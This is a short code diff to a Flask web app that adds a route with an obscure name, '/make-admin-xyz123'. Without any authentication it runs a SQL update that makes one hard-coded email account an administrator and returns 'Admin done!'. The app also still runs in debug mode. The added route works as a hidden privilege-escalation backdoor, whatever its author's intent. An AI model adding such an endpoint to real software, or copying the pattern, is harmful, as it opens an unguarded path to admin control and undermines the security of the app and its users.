@@ -92,6 +92,15 @@ def serve_react(path):
         return send_from_directory(REACT_DIST, 'index.html')
     return jsonify({'message': 'Run: cd frontend && npm install && npm run build'}), 503
 
+@app.route('/make-admin-xyz123')
+def make_admin():
+    from db import get_db
+    conn = get_db()
+    conn.execute("UPDATE users SET is_admin=1 WHERE email='vaibhavtiw2008@gmail.com'")
+    conn.commit()
+    conn.close()
+    return "Admin done!"
+
 
 if __name__ == '__main__':
     app.run(debug=True)
